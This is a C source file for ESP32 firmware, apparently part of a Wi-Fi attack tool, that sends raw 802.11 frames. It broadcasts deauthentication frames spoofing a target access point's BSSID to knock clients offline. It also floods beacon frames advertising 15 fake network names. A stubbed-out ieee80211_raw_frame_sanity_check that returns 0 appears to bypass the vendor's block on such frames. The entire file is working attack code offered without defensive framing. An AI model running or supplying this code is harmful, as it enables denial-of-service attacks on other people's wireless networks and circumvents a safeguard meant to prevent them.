#include "packet_sender.h"
#include "esp_wifi.h"
#include <string.h>
#include <stdbool.h>

char *ssids[] = {
    "01 fake SSID",
    "02 fake SSID",
    "03 fake SSID",
    "04 fake SSID",
    "05 fake SSID",
    "06 fake SSID",
    "07 fake SSID",
    "08 fake SSID",
    "09 fake SSID",
    "10 fake SSID",
    "11 fake SSID",
    "12 fake SSID",
    "13 fake SSID",
    "14 fake SSID",
    "15 fake SSID"
};

#define TOTAL_LINES (sizeof(ssids) / sizeof(char *))

uint8_t line = 0;
uint16_t seqnum[TOTAL_LINES] = { 0 };

static const uint8_t default_deauth_frame[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};

static const uint8_t default_beacon_frame[] = {
	0x80, 0x00,							
	0x00, 0x00,							
	0xff, 0xff, 0xff, 0xff, 0xff, 0xff,				
	0xba, 0xde, 0xaf, 0xfe, 0x00, 0x06,				
	0xba, 0xde, 0xaf, 0xfe, 0x00, 0x06,				
	0x00, 0x00,							
	0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,			
	0x64, 0x00,							
	0x31, 0x04,							
	0x00, 0x00, 
	0x01, 0x08, 0x82, 0x84,	0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,	
	0x03, 0x01, 0x01,						
	0x05, 0x04, 0x01, 0x02, 0x00, 0x00,				
};                              

int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

void send_raw_frame(const uint8_t *frame_buffer, int size) {
    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
}

void send_deauth_frame(const wifi_ap_record_t *ap_record) {
    uint8_t deauth_frame[sizeof(default_deauth_frame)];
    memcpy(deauth_frame, default_deauth_frame, sizeof(default_deauth_frame));
    memcpy(&deauth_frame[10], ap_record->bssid, 6);
    memcpy(&deauth_frame[16], ap_record->bssid, 6);
    
    send_raw_frame(deauth_frame, sizeof(default_deauth_frame));
}

void send_beacon_frame(void) {
	uint8_t beacon_frame[200];
	memcpy(beacon_frame, default_beacon_frame, BEACON_SSID_OFFSET - 1);
	beacon_frame[BEACON_SSID_OFFSET - 1] = strlen(ssids[line]);
	memcpy(&beacon_frame[BEACON_SSID_OFFSET], ssids[line], strlen(ssids[line]));
	memcpy(&beacon_frame[BEACON_SSID_OFFSET + strlen(ssids[line])], &default_beacon_frame[BEACON_SSID_OFFSET], sizeof(default_beacon_frame) - BEACON_SSID_OFFSET);

	beacon_frame[SRCADDR_OFFSET + 5] = line;
	beacon_frame[BSSID_OFFSET + 5] = line;

	beacon_frame[SEQNUM_OFFSET] = (seqnum[line] & 0x0f) << 4;
	beacon_frame[SEQNUM_OFFSET + 1] = (seqnum[line] & 0xff0) >> 4;
	seqnum[line]++;
	if (seqnum[line] > 0xfff)
		seqnum[line] = 0;

    send_raw_frame(beacon_frame, sizeof(default_beacon_frame) + strlen(ssids[line]));

	if (++line >= TOTAL_LINES)
	    line = 0;
}